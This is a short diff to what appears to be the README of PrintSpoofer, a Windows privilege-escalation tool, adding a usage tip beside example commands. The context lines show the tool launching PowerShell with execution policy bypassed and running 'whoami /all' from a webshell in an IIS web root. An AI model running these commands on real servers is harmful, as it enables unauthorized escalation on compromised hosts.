@@ -104,6 +104,8 @@ C:\TOOLS>PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
 ```cmd
 /c C:\inetpub\wwwroot\PrintSpoofer.exe -c "c:\\windows\\system32\\cmd.exe /c whoami /all > C:\\inetpub\\wwwroot\\tmp.txt & exit" && type C:\\inetpub\\wwwroot\\tmp.txt
 ```
+**run twice for output command result** 
+
 <p align="center">
   <img src="run_on_webshell.png">
 </p>
